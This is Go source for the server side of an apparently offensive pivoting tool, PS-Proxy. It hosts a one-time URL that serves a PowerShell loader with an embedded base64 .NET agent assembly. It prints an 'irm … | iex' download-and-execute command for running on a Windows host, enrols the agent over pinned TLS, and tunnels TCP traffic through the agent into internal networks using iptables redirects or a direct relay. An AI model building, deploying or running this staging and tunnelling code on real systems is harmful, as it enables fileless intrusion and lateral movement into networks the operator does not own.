package main

import (
	"bufio"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"encoding/pem"
	"errors"
	"flag"
	"fmt"
	"html/template"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/psproxy/psproxy/internal/protocol"
	"github.com/psproxy/psproxy/internal/staging"
)

func main() {
	domain := flag.String("domain", "", "public DNS name used for TLS and agent staging")
	port := flag.Int("port", 443, "TLS listener port")
	cert := flag.String("cert", "", "TLS fullchain PEM; defaults to /etc/letsencrypt/live/<domain>/fullchain.pem")
	key := flag.String("key", "", "TLS private key PEM; defaults to /etc/letsencrypt/live/<domain>/privkey.pem")
	tun := flag.String("tun", "psproxy0", "TUN interface name for the planned netstack data plane")
	agentTemplate := flag.String("agent-template", "agent/loader/agent.ps1.tmpl", "PowerShell agent loader template")
	agentAssemblyFile := flag.String("agent-assembly-b64-file", "", "file containing compressed/base64 PSProxy.Agent.dll; defaults to release/agent_assembly.b64 when present")
	redirect := flag.Bool("redirect", false, "install Linux iptables REDIRECT rules for --route CIDRs and relay original destinations through the agent")
	redirectPort := flag.Int("redirect-port", 15080, "local transparent redirect listener port")
	tcpListen := flag.String("tcp-listen", "", "developer TCP relay listener, e.g. 127.0.0.1:1389")
	tcpTarget := flag.String("tcp-target", "", "developer TCP relay target opened by the agent, e.g. 10.10.10.219:389")
	routes := multiFlag{}
	flag.Var(&routes, "route", "CIDR to route through the future TUN/netstack data plane; repeatable")
	ttl := flag.Duration("agent-url-ttl", 10*time.Minute, "one-time agent URL lifetime")
	listen := flag.String("listen", "0.0.0.0", "listener address")
	flag.Parse()
	if *domain == "" {
		log.Fatal("--domain is required")
	}
	if *cert == "" {
		*cert = filepath.Join("/etc/letsencrypt/live", *domain, "fullchain.pem")
	}
	if *key == "" {
		*key = filepath.Join("/etc/letsencrypt/live", *domain, "privkey.pem")
	}
	if (*tcpListen == "") != (*tcpTarget == "") {
		log.Fatal("--tcp-listen and --tcp-target must be supplied together")
	}
	if *redirect && len(routes) == 0 {
		log.Fatal("--redirect requires at least one --route CIDR")
	}
	pin, err := certPin(*cert)
	if err != nil {
		log.Fatalf("certificate pin failed: %v", err)
	}
	assembly, err := loadAssemblyB64(*agentAssemblyFile)
	if err != nil {
		log.Fatalf("agent assembly load failed: %v", err)
	}
	if assembly == "__ASSEMBLY_B64__" {
		log.Printf("WARNING: agent assembly is not packaged; generated agent will instruct you to run tools/build-agent.ps1")
	}
	tmpl := template.Must(template.ParseFiles(*agentTemplate))
	store := staging.NewStore(*ttl)
	sess, err := store.Create(*domain, *port, pin)
	if err != nil {
		log.Fatal(err)
	}
	server := NewTunnelServer(store)
	mux := http.NewServeMux()
	mux.HandleFunc("GET /a/{id}", staging.AgentHandler(store, tmpl, assembly))
	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, r *http.Request) { _, _ = w.Write([]byte("ok\n")) })
	var redirectCleanup func()
	if *redirect {
		redirectCleanup = setupRedirectOrFatal(routes, *redirectPort)
		defer redirectCleanup()
		go serveTransparentRelay(fmt.Sprintf("127.0.0.1:%d", *redirectPort), server)
	}
	if *tcpListen != "" {
		go serveTCPRelay(*tcpListen, *tcpTarget, server)
	}
	installSignalCleanup(redirectCleanup)
	addr := fmt.Sprintf("%s:%d", *listen, *port)
	log.Printf("PS-Proxy Go server starting on https://%s", addr)
	log.Printf("TLS certificate: %s", *cert)
	log.Printf("Agent cert pin: %s", pin)
	log.Printf("Planned TUN target: %s routes=%s", *tun, strings.Join(routes, ","))
	if *redirect {
		log.Printf("Transparent redirect mode enabled on 127.0.0.1:%d", *redirectPort)
	}
	if *tcpListen != "" {
		log.Printf("Developer TCP relay: %s -> agent -> %s", *tcpListen, *tcpTarget)
	}
	log.Printf("Run this on the Windows host: irm %s/a/%s | iex", publicURL(*domain, *port), sess.ID)
	log.Fatal(serveMixedTLS(addr, *cert, *key, mux, server))
}

type TunnelServer struct {
	store   *staging.Store
	mu      sync.Mutex
	session *AgentSession
	nextID  atomic.Uint64
}

func NewTunnelServer(store *staging.Store) *TunnelServer { return &TunnelServer{store: store} }

func (s *TunnelServer) SetSession(a *AgentSession) {
	s.mu.Lock()
	old := s.session
	s.session = a
	s.mu.Unlock()
	if old != nil {
		old.Close()
	}
}

func (s *TunnelServer) Current() *AgentSession { s.mu.Lock(); defer s.mu.Unlock(); return s.session }

func (s *TunnelServer) OpenAttached(target string, local net.Conn) (*AgentSession, uint64, error) {
	a := s.Current()
	if a == nil {
		return nil, 0, errors.New("no enrolled agent connected")
	}
	id := s.nextID.Add(1)
	a.AttachLocal(id, local)
	if err := a.Open(id, target); err != nil {
		a.RemoveLocal(id)
		return nil, 0, err
	}
	return a, id, nil
}

type AgentSession struct {
	conn      net.Conn
	br        *bufio.Reader
	sendMu    sync.Mutex
	closeOnce sync.Once
	closed    chan struct{}
	mu        sync.Mutex
	pending   map[uint64]chan error
	locals    map[uint64]net.Conn
}

func NewAgentSession(c net.Conn, br *bufio.Reader) *AgentSession {
	return &AgentSession{conn: c, br: br, closed: make(chan struct{}), pending: map[uint64]chan error{}, locals: map[uint64]net.Conn{}}
}

func (a *AgentSession) Close() { a.closeOnce.Do(func() { close(a.closed); _ = a.conn.Close() }) }

func (a *AgentSession) send(f protocol.Frame) error {
	a.sendMu.Lock()
	defer a.sendMu.Unlock()
	return protocol.WriteFrame(a.conn, f)
}

func (a *AgentSession) Open(id uint64, target string) error {
	ch := make(chan error, 1)
	a.mu.Lock()
	a.pending[id] = ch
	a.mu.Unlock()
	if err := a.send(protocol.Frame{StreamID: id, Type: protocol.FrameOpen, Payload: []byte(target)}); err != nil {
		a.mu.Lock()
		delete(a.pending, id)
		a.mu.Unlock()
		return err
	}
	select {
	case err := <-ch:
		return err
	case <-time.After(30 * time.Second):
		a.mu.Lock()
		delete(a.pending, id)
		a.mu.Unlock()
		return errors.New("timeout waiting for agent open")
	}
}

func (a *AgentSession) AttachLocal(id uint64, c net.Conn) {
	a.mu.Lock()
	a.locals[id] = c
	a.mu.Unlock()
}

func (a *AgentSession) RemoveLocal(id uint64) {
	a.mu.Lock()
	delete(a.locals, id)
	a.mu.Unlock()
}

func (a *AgentSession) Run() {
	defer a.Close()
	for {
		f, err := protocol.ReadFrame(a.br)
		if err != nil {
			log.Printf("agent disconnected: %v", err)
			return
		}
		switch f.Type {
		case protocol.FrameOpenOK:
			a.mu.Lock()
			ch := a.pending[f.StreamID]
			delete(a.pending, f.StreamID)
			a.mu.Unlock()
			if ch != nil {
				ch <- nil
			}
		case protocol.FrameOpenFail:
			a.mu.Lock()
			ch := a.pending[f.StreamID]
			delete(a.pending, f.StreamID)
			a.mu.Unlock()
			if ch != nil {
				ch <- fmt.Errorf("agent open failed: %s", string(f.Payload))
			}
		case protocol.FrameData:
			a.mu.Lock()
			c := a.locals[f.StreamID]
			a.mu.Unlock()
			if c != nil {
				_, _ = c.Write(f.Payload)
			}
		case protocol.FrameClose:
			a.mu.Lock()
			c := a.locals[f.StreamID]
			delete(a.locals, f.StreamID)
			a.mu.Unlock()
			if c != nil {
				_ = c.Close()
			}
		case protocol.FramePing:
			_ = a.send(protocol.Frame{StreamID: f.StreamID, Type: protocol.FramePong})
		}
	}
}

func serveTransparentRelay(listenAddr string, server *TunnelServer) {
	ln, err := net.Listen("tcp4", listenAddr)
	if err != nil {
		log.Fatalf("transparent relay listen failed: %v", err)
	}
	log.Printf("transparent relay listening on %s", listenAddr)
	for {
		c, err := ln.Accept()
		if err != nil {
			log.Printf("transparent relay accept failed: %v", err)
			continue
		}
		target, err := originalDst(c)
		if err != nil {
			log.Printf("original destination lookup failed: %v", err)
			_ = c.Close()
			continue
		}
		go handleLocalTCP(c, target, server)
	}
}

func originalDst(c net.Conn) (string, error) {
	tcp, ok := c.(*net.TCPConn)
	if !ok {
		return "", errors.New("connection is not TCP")
	}
	raw, err := tcp.SyscallConn()
	if err != nil {
		return "", err
	}
	var target string
	var opErr error
	err = raw.Control(func(fd uintptr) {
		mreq, err := syscall.GetsockoptIPv6Mreq(int(fd), syscall.IPPROTO_IP, 80) // SO_ORIGINAL_DST
		if err != nil {
			opErr = err
			return
		}
		port := int(mreq.Multiaddr[2])<<8 | int(mreq.Multiaddr[3])
		ip := net.IPv4(mreq.Multiaddr[4], mreq.Multiaddr[5], mreq.Multiaddr[6], mreq.Multiaddr[7]).String()
		target = fmt.Sprintf("%s:%d", ip, port)
	})
	if err != nil {
		return "", err
	}
	if opErr != nil {
		return "", opErr
	}
	if target == "" {
		return "", errors.New("empty original destination")
	}
	return target, nil
}

func setupRedirectOrFatal(routes []string, port int) func() {
	if os.Geteuid() != 0 {
		log.Fatal("--redirect requires root so iptables NAT rules can be installed")
	}
	chain := "PSPROXY"
	runIPTables("-t", "nat", "-N", chain)
	runIPTables("-t", "nat", "-F", chain)
	if !iptablesOK("-t", "nat", "-C", "OUTPUT", "-p", "tcp", "-j", chain) {
		runIPTablesOrFatal("-t", "nat", "-A", "OUTPUT", "-p", "tcp", "-j", chain)
	}
	for _, route := range routes {
		runIPTablesOrFatal("-t", "nat", "-A", chain, "-p", "tcp", "-d", route, "-j", "REDIRECT", "--to-ports", fmt.Sprint(port))
	}
	log.Printf("installed iptables redirect rules for routes=%s", strings.Join(routes, ","))
	return func() {
		runIPTables("-t", "nat", "-D", "OUTPUT", "-p", "tcp", "-j", chain)
		runIPTables("-t", "nat", "-F", chain)
		runIPTables("-t", "nat", "-X", chain)
		log.Printf("removed iptables redirect rules")
	}
}

func installSignalCleanup(cleanup func()) {
	if cleanup == nil {
		return
	}
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-ch
		cleanup()
		os.Exit(0)
	}()
}

func iptablesOK(args ...string) bool { return exec.Command("iptables", args...).Run() == nil }
func runIPTables(args ...string)     { _ = exec.Command("iptables", args...).Run() }
func runIPTablesOrFatal(args ...string) {
	cmd := exec.Command("iptables", args...)
	if out, err := cmd.CombinedOutput(); err != nil {
		log.Fatalf("iptables %s failed: %v: %s", strings.Join(args, " "), err, strings.TrimSpace(string(out)))
	}
}

func serveTCPRelay(listenAddr, target string, server *TunnelServer) {
	ln, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatalf("tcp relay listen failed: %v", err)
	}
	log.Printf("tcp relay listening on %s", listenAddr)
	for {
		c, err := ln.Accept()
		if err != nil {
			log.Printf("tcp relay accept failed: %v", err)
			continue
		}
		go handleLocalTCP(c, target, server)
	}
}

func handleLocalTCP(c net.Conn, target string, server *TunnelServer) {
	defer c.Close()
	a, id, err := server.OpenAttached(target, c)
	if err != nil {
		log.Printf("tcp relay open failed: %v", err)
		return
	}
	defer a.RemoveLocal(id)
	buf := make([]byte, 32768)
	for {
		n, err := c.Read(buf)
		if n > 0 {
			if sendErr := a.send(protocol.Frame{StreamID: id, Type: protocol.FrameData, Payload: append([]byte(nil), buf[:n]...)}); sendErr != nil {
				return
			}
		}
		if err != nil {
			_ = a.send(protocol.Frame{StreamID: id, Type: protocol.FrameClose})
			return
		}
	}
}

func serveMixedTLS(addr, certFile, keyFile string, mux *http.ServeMux, server *TunnelServer) error {
	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
	if err != nil {
		return err
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	cfg := &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12}
	for {
		raw, err := ln.Accept()
		if err != nil {
			return err
		}
		go handleTLSConn(raw, cfg, mux, server)
	}
}

func handleTLSConn(raw net.Conn, cfg *tls.Config, mux *http.ServeMux, server *TunnelServer) {
	conn := tls.Server(raw, cfg)
	if err := conn.Handshake(); err != nil {
		_ = raw.Close()
		return
	}
	br := bufio.NewReader(conn)
	peek, err := br.Peek(len(protocol.Magic))
	if err != nil {
		_ = conn.Close()
		return
	}
	if string(peek) == protocol.Magic {
		_, _ = br.Discard(len(protocol.Magic))
		handleAgent(conn, br, server)
		return
	}
	sln := &singleListener{conn: &bufferedConn{Conn: conn, r: br}, done: make(chan struct{})}
	_ = http.Serve(sln, mux)
}

func handleAgent(conn net.Conn, br *bufio.Reader, server *TunnelServer) {
	line, err := br.ReadString('\n')
	if err != nil {
		_ = conn.Close()
		return
	}
	line = strings.TrimSpace(line)
	const prefix = "ENROLL "
	if !strings.HasPrefix(line, prefix) {
		_ = conn.Close()
		return
	}
	if err := server.store.Enroll(strings.TrimSpace(strings.TrimPrefix(line, prefix))); err != nil {
		log.Printf("agent enrollment failed: %v", err)
		_ = conn.Close()
		return
	}
	a := NewAgentSession(conn, br)
	server.SetSession(a)
	log.Printf("agent enrolled and connected from %s", conn.RemoteAddr())
	_ = a.send(protocol.Frame{Type: protocol.FramePong, Payload: []byte("OK")})
	a.Run()
}

type singleListener struct {
	conn net.Conn
	done chan struct{}
	once sync.Once
}

func (s *singleListener) Accept() (net.Conn, error) {
	if s.conn == nil {
		<-s.done
		return nil, io.EOF
	}
	c := s.conn
	s.conn = nil
	return c, nil
}
func (s *singleListener) Close() error   { s.once.Do(func() { close(s.done) }); return nil }
func (s *singleListener) Addr() net.Addr { return dummyAddr("single") }

type dummyAddr string

func (d dummyAddr) Network() string { return string(d) }
func (d dummyAddr) String() string  { return string(d) }

type bufferedConn struct {
	net.Conn
	r *bufio.Reader
}

func (b *bufferedConn) Read(p []byte) (int, error) { return b.r.Read(p) }

type multiFlag []string

func (m *multiFlag) String() string     { return strings.Join(*m, ",") }
func (m *multiFlag) Set(v string) error { *m = append(*m, v); return nil }

func certPin(path string) (string, error) {
	pemBytes, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	block, _ := pem.Decode(pemBytes)
	if block == nil || block.Type != "CERTIFICATE" {
		return "", fmt.Errorf("no PEM certificate found in %s", path)
	}
	sum := sha256.Sum256(block.Bytes)
	return hex.EncodeToString(sum[:]), nil
}
func publicURL(domain string, port int) string {
	if port == 443 {
		return "https://" + domain
	}
	return fmt.Sprintf("https://%s:%d", domain, port)
}
func loadAssemblyB64(path string) (string, error) {
	if path == "" {
		if _, err := os.Stat("release/agent_assembly.b64"); err == nil {
			path = "release/agent_assembly.b64"
		} else {
			return "__ASSEMBLY_B64__", nil
		}
	}
	b, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(b)), nil
}
